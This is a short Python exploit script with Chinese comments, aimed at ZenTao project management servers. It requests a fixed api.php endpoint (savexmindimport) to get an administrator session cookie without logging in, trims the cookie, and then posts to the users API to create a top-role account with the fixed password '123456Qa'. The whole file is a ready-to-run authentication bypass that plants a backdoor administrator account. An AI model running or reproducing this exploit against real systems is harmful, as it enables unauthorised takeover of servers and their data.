# -*- coding: UTF-8 -*-
# !/usr/bin/python
 
import requests
import re
from bs4 import BeautifulSoup


def getCookie(host):
    url1 = "http://" + host + "/zentao"
    url = url1 + "/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID=fkazcfyqgknhqdkbpttl&branch=qkkcluybdvfxqngbemmn"
    headers={
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Accept-Language":"zh-CN,zh;q=0.9",
        "Host":host}
    response = requests.get(url,headers=headers)
    SetCookie = response.headers.get('Set-Cookie')
    return SetCookie
# 向固定api接口发送请求以获取管理员cookie，并截取获取到的setcookie字符串前43位（因响应会将Setcookie后的字段一并输出，所以需要截取长度）


def addUser(SetCookie,host):
    weburl = "http://" + host + "/zentao/api.php/v1/users"
    headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        "Accept-Language":"zh-CN,zh;q=0.9",
        "Host":host,
        "cookie":SetCookie}
    timeout = 8
    data = {'account': 'test',
            'password': '123456Qa',
            'realname': 'test',
            'role': 'top',
            'group': '1'}
    res = requests.post(weburl,headers=headers,data=data,timeout=timeout)
    return res
# 将获取的管理员Cookie填入请求，创建用户


def main():
    """主程序"""
    weburl = "192.168.110.144"
    host = str(weburl)
# weburl参数需自行修改
    SetCookie = getCookie(host)
    if SetCookie == None:
        print("获取Cookie失败，漏洞可能已被修复。\n")
    else:
        set_cookies = SetCookie[:43]
        res1 = addUser(set_cookies,host)
        if str(res1.status_code) == "400":
# 状态码为400时表示账号已存在或创建失败
            print("账号可能已存在，请尝试更换用户名。\n")
        else:
            print("账号已生成。")

if __name__ == '__main__':
    main()

